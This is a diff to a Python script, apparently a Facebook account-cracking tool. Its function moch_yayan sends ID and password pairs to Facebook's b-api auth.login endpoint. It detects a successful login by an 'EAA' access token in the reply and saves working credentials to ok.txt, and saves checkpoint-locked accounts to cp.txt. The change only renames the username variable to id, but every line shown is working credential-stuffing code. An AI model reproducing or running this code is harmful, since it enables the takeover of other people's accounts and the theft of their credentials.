@@ -113,7 +113,7 @@ def moch_yayan():
                      'access_token': b,
                      'format': 'JSON',
                      'sdk_version': '2',
-                     'email': username,
+                     'email': id,
                      'locale': 'en_US',
                      'password': password,
                      'sdk': 'ios',
@@ -123,23 +123,23 @@ def moch_yayan():
              api = 'https://b-api.facebook.com/method/auth.login'
              response = requests.get(api, params=params)
              if 'EAA' in response.text:
-                 print(f"\r\033[1;92m  * --> {username}|{password}                       ",end="")
+                 print(f"\r\033[1;92m  * --> {id}|{password}                       ",end="")
                  print()
                  result += 1
                  if cek:
-                        life.append(username+"|"+password)
+                        life.append(id+"|"+password)
                  else:
                         with open('ok.txt','a') as f:
-                                f.write(username + '|' + password + '\n')
+                                f.write(id + '|' + password + '\n')
              elif 'www.facebook.com' in response.json()['error_msg']:
-                   print(f"\r\033[1;93m  * --> {username}|{password}                    ",end="")
+                   print(f"\r\033[1;93m  * --> {id}|{password}                    ",end="")
                    print()
                    check += 1
                    if cek:
-                           chek.append(username+"|"+password)
+                           chek.append(id+"|"+password)
                    else:
                            with open('cp.txt','a') as f:
-                                f.write(username + '|' + password + '\n')
+                                f.write(id + '|' + password + '\n')
              else:
                    die += 1
              for i in list('\|/-•'):
